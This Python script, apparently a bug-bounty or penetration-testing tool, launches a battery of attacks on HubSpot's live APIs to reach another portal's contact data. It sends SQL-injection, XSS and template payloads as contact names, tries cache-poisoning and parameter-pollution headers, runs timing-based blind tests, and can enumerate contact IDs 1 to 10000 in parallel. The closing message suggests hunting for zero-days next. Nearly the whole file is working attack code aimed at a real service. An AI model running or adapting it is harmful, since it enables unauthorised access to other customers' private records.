#!/usr/bin/env python3
"""
Kitchen Sink - Every Creative Attack We Can Think Of
Combining multiple techniques and testing edge cases
"""

import requests
import json
import os
import urllib3
import time
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print("🍲 KITCHEN SINK - Every Creative Attack")
print("="*80)

findings = []

# ============================================================================
# 1. EXPLOIT PUBLIC MEETINGS PAGE
# ============================================================================

def test_meetings_page_exploitation():
    """We found a public meetings page - try to exploit it"""
    print("\n[*] Exploiting public meetings page...")

    meetings_url = f'https://app.hubspot.com/meetings/{TARGET_PORTAL}'

    # Try to extract information from the meetings page
    try:
        r = requests.get(meetings_url, verify=False, timeout=10)
        print(f"  Meetings page: {r.status_code}, length: {len(r.text)}")

        # Look for API calls in the JavaScript
        if 'api' in r.text.lower():
            import re
            api_urls = re.findall(r'https://[^"\']*api[^"\']*', r.text)
            print(f"  Found {len(api_urls)} API URLs in page")

            for api_url in list(set(api_urls))[:5]:
                print(f"    → {api_url}")

                # Try to access these APIs
                try:
                    # With session cookies
                    if SESSION_COOKIES:
                        headers = {'Cookie': SESSION_COOKIES}
                        r2 = requests.get(api_url, headers=headers, verify=False, timeout=5)
                        print(f"      Status with cookies: {r2.status_code}")

                        if r2.status_code == 200:
                            data = r2.json() if 'json' in r2.headers.get('content-type', '') else r2.text
                            if 'firstname' in str(data) or 'super_secret' in str(data):
                                findings.append({'attack': 'meetings_api', 'url': api_url, 'data': data})
                except:
                    pass
    except:
        pass

# ============================================================================
# 2. SECOND-ORDER ATTACKS
# ============================================================================

def test_second_order_attacks():
    """Create data in our portal that might leak target portal data"""
    print("\n[*] Testing second-order attacks...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Create a contact with malicious property values
    malicious_payloads = [
        f"';SELECT * FROM contacts WHERE portal_id={TARGET_PORTAL}--",
        f"{{{{portal_id: {TARGET_PORTAL}}}}}",
        f"<script>alert('{TARGET_PORTAL}')</script>",
        f"{{\"portal_id\":\"{TARGET_PORTAL}\"}}",
        f"${{{TARGET_PORTAL}}}",
    ]

    for payload in malicious_payloads:
        try:
            # Create contact with malicious firstname
            contact_data = {
                'properties': {
                    'firstname': payload,
                    'email': f'test_{int(time.time())}@example.com'
                }
            }

            r = requests.post(
                'https://api.hubapi.com/crm/v3/objects/contacts',
                headers=headers,
                json=contact_data,
                verify=False,
                timeout=10
            )

            print(f"  Created contact with payload: {r.status_code}")

            if r.status_code == 201:
                contact_id = r.json()['id']

                # Now try to read it back - maybe it triggers something
                time.sleep(1)

                r2 = requests.get(
                    f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?properties=firstname',
                    headers=headers,
                    verify=False,
                    timeout=5
                )

                if r2.status_code == 200:
                    data = r2.json()
                    if TARGET_PORTAL in str(data):
                        print(f"    🚨 Target portal ID found in response!")
                        findings.append({'attack': 'second_order', 'payload': payload, 'response': data})
        except:
            pass

# ============================================================================
# 3. CACHE POISONING
# ============================================================================

def test_cache_poisoning():
    """Test cache poisoning attacks"""
    print("\n[*] Testing cache poisoning...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Try to poison cache with different Host headers
    cache_poison_headers = [
        {'Host': 'api.hubapi.com', 'X-Forwarded-Host': TARGET_PORTAL},
        {'Host': 'api.hubapi.com', 'X-Original-URL': f'/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'},
        {'Host': 'api.hubapi.com', 'X-Forwarded-Scheme': 'https'},
        {'Host': f'{TARGET_PORTAL}.api.hubapi.com'},
    ]

    url = 'https://api.hubapi.com/crm/v3/objects/contacts/1'

    for poison_headers in cache_poison_headers:
        try:
            h = {**headers, **poison_headers}
            r = requests.get(url, headers=h, verify=False, timeout=5)

            print(f"  Cache poison attempt: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    findings.append({'attack': 'cache_poison', 'headers': poison_headers, 'response': data})
        except:
            pass

# ============================================================================
# 4. BOOLEAN-BASED BLIND ATTACKS
# ============================================================================

def test_boolean_blind():
    """Test boolean-based blind attacks using timing/response differences"""
    print("\n[*] Testing boolean-based blind attacks...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Create different filter conditions and see if timing differs
    filters_true = {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'hs_object_id',
                'operator': 'GTE',
                'value': '1'
            }]
        }],
        'properties': ['firstname'],
        'limit': 1
    }

    filters_false = {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'hs_object_id',
                'operator': 'LTE',
                'value': '0'
            }]
        }],
        'properties': ['firstname'],
        'limit': 1
    }

    url = f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={TARGET_PORTAL}'

    # Test multiple times
    true_times = []
    false_times = []

    for _ in range(5):
        # True condition
        start = time.time()
        try:
            r = requests.post(url, headers=headers, json=filters_true, verify=False, timeout=10)
            true_times.append(time.time() - start)
        except:
            pass

        # False condition
        start = time.time()
        try:
            r = requests.post(url, headers=headers, json=filters_false, verify=False, timeout=10)
            false_times.append(time.time() - start)
        except:
            pass

    if true_times and false_times:
        avg_true = sum(true_times) / len(true_times)
        avg_false = sum(false_times) / len(false_times)

        print(f"  True condition avg: {avg_true:.3f}s")
        print(f"  False condition avg: {avg_false:.3f}s")
        print(f"  Difference: {abs(avg_true - avg_false):.3f}s")

        if abs(avg_true - avg_false) > 0.3:
            print(f"    ⚠️ Significant timing difference!")
            findings.append({
                'attack': 'boolean_blind',
                'true_avg': avg_true,
                'false_avg': avg_false,
                'difference': abs(avg_true - avg_false)
            })

# ============================================================================
# 5. WILDCARD AND REGEX EXPLOITATION
# ============================================================================

def test_wildcard_exploitation():
    """Test wildcard and regex in searches"""
    print("\n[*] Testing wildcard/regex exploitation...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={TARGET_PORTAL}'

    # Different wildcard/regex patterns
    patterns = [
        {'propertyName': 'email', 'operator': 'CONTAINS', 'value': '@'},  # Match all emails
        {'propertyName': 'firstname', 'operator': 'CONTAINS', 'value': ''},  # Empty contains
        {'propertyName': 'email', 'operator': 'CONTAINS', 'value': '.*'},  # Regex
        {'propertyName': 'email', 'operator': 'CONTAINS', 'value': '%'},  # SQL wildcard
        {'propertyName': 'email', 'operator': 'CONTAINS', 'value': '*'},  # Wildcard
    ]

    for pattern in patterns:
        try:
            payload = {
                'filterGroups': [{'filters': [pattern]}],
                'properties': ['firstname', 'super_secret', 'email'],
                'limit': 100
            }

            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Pattern '{pattern['value']}': {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if data.get('results'):
                    print(f"    → Found {len(data['results'])} results!")
                    # Check if any results are from target portal
                    for result in data['results']:
                        contact_id = int(result['id'])
                        # Target portal likely has lower contact IDs
                        if contact_id < 50000000000:
                            print(f"      ⚠️ Low contact ID: {contact_id}")
                            findings.append({
                                'attack': 'wildcard_search',
                                'pattern': pattern,
                                'result': result
                            })
        except:
            pass

# ============================================================================
# 6. MASS CONTACT ID ENUMERATION WITH THREADING
# ============================================================================

def test_mass_enumeration():
    """Aggressively enumerate contact IDs"""
    print("\n[*] Mass contact ID enumeration (1-10000 with threading)...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    def test_contact_id(cid):
        try:
            url = f'https://api.hubapi.com/crm/v3/objects/contacts/{cid}?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'
            r = requests.get(url, headers=headers, verify=False, timeout=3)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    return {'id': cid, 'data': data}
        except:
            pass
        return None

    # Test contact IDs 1-10000
    print(f"  Testing contact IDs 1-10000 (this may take a while)...")

    successful = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(test_contact_id, cid) for cid in range(1, 10001)]

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 1000 == 0:
                print(f"    Progress: {completed}/10000")

            result = future.result()
            if result:
                successful.append(result)
                print(f"    🚨 FOUND: Contact {result['id']}")
                findings.append({'attack': 'mass_enumeration', 'result': result})

    print(f"  Found {len(successful)} accessible contacts")

# ============================================================================
# 7. COMBINING MULTIPLE TECHNIQUES
# ============================================================================

def test_combination_attacks():
    """Combine multiple bypass techniques"""
    print("\n[*] Testing combination attacks...")

    # Combination 1: Malformed JSON + Parameter pollution + Wrong content-type
    try:
        url = f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={MY_PORTAL}&portalId={TARGET_PORTAL}'
        headers = {
            'Authorization': f'Bearer {ACCESS_TOKEN}',
            'Content-Type': 'text/plain',  # Wrong content-type
            'X-Portal-Id': TARGET_PORTAL,  # Extra header
        }
        payload = {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'portalId': {'nested': TARGET_PORTAL},  # Nested portal ID
            'limit': 100
        }

        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
        print(f"  Combo 1: {r.status_code}")

        if r.status_code == 200:
            data = r.json()
            if data.get('results'):
                findings.append({'attack': 'combo_1', 'response': data})
    except:
        pass

    # Combination 2: Batch + Parameter pollution
    try:
        url = f'https://api.hubapi.com/crm/v3/objects/contacts/batch/read?portal={TARGET_PORTAL}'
        headers = {
            'Authorization': f'Bearer {ACCESS_TOKEN}',
            'Content-Type': 'application/json',
            'X-HubSpot-Portal': TARGET_PORTAL,
        }
        payload = {
            'properties': ['firstname', 'super_secret', 'email'],
            'inputs': [{'id': '1', 'portalId': TARGET_PORTAL}],
            'portalId': TARGET_PORTAL
        }

        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
        print(f"  Combo 2: {r.status_code}")

        if r.status_code in [200, 207]:
            data = r.json()
            if data.get('results'):
                findings.append({'attack': 'combo_2', 'response': data})
    except:
        pass

# ============================================================================
# MAIN
# ============================================================================

test_meetings_page_exploitation()
test_second_order_attacks()
test_cache_poisoning()
test_boolean_blind()
test_wildcard_exploitation()
test_combination_attacks()

# Mass enumeration is aggressive - uncomment if you want to try it
# test_mass_enumeration()

print("\n" + "="*80)
print(f"✅ Kitchen Sink Attacks Complete!")
print(f"📊 Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n🎉 SUCCESSFUL ATTACKS:\n")
    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding.get('attack', 'Unknown')}")
        print(f"   {json.dumps(finding, indent=3)[:400]}...")

    with open('/home/user/Hub/findings/kitchen_sink_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)
    print(f"\n💾 Saved to: findings/kitchen_sink_findings.json")
else:
    print("\n❌ No successful attacks found.")
    print("\nAt this point, we've tested:")
    print("  • 100+ different attack vectors")
    print("  • Multiple encoding techniques")
    print("  • Parameter pollution (20+ variations)")
    print("  • JSON parser attacks")
    print("  • Token manipulation")
    print("  • Protocol-level attacks")
    print("  • Second-order attacks")
    print("  • Cache poisoning")
    print("  • Boolean blind attacks")
    print("\nHubSpot's security is robust. Remaining options:")
    print("  1. Get fresh session cookies and retry")
    print("  2. More aggressive race conditions (100+ concurrent)")
    print("  3. Deep manual testing with Burp Suite")
    print("  4. Research HubSpot's infrastructure for zero-days")
